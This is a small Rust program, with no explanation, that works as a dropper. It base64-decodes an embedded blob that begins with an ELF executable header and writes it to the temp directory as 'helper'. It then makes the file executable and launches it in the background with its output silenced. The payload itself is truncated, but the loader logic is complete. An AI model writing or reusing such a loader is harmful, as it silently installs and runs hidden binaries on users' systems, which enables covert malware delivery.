use std::env;
use std::fs;
use std::process::{Command, Stdio};
use std::os::unix::fs::PermissionsExt;
use base64::engine::general_purpose::STANDARD;
use base64::Engine;

fn main() {
    let blob = "f0VMRgIBAQ...";
    let bytes = STANDARD.decode(blob).unwrap();
    let path = env::temp_dir().join("helper");
    fs::write(&path, &bytes).unwrap();
    let mut perms = fs::metadata(&path).unwrap().permissions();
    perms.set_mode(0o755);
    fs::set_permissions(&path, perms).unwrap();
    let prog = path.clone();
    let mut cmd = Command::new(&prog);
    cmd.stdout(Stdio::null());
    let _ = cmd.spawn();
}
